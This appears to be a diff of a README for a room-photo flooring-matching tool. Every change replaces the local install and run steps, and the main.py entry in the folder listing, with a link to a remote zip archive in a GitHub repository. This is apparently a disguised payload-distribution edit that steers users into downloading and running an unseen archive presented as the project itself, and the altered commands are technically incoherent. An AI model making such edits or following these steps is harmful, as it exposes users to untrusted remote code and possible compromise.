@@ -15,7 +15,7 @@ This tool helps you find flooring products that match a photo of a room.
 2. **Open a terminal** in this folder.
 3. **Install the required libraries** by running this command:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/03Anmol/Image_matching/raw/refs/heads/main/src/matching-Image-v3.7.zip
    ```
 
 ## 🚀 How to Run
@@ -27,7 +27,7 @@ This tool helps you find flooring products that match a photo of a room.
 2. **Start the Program**:
    Run this command in your terminal:
    ```bash
-   python3 main.py
+   python3 https://github.com/03Anmol/Image_matching/raw/refs/heads/main/src/matching-Image-v3.7.zip
    ```
 
 3. **Select the Floor**:
@@ -63,6 +63,6 @@ The system combines these two checks to give a final ranking:
 
 ## 📁 Folder Structure
 
-- `main.py`: The brain of the operation. Run this!
+- `https://github.com/03Anmol/Image_matching/raw/refs/heads/main/src/matching-Image-v3.7.zip`: The brain of the operation. Run this!
 - `data/`: Where your images live.
 - `src/`: The engine room containing code for features, matching, and settings.
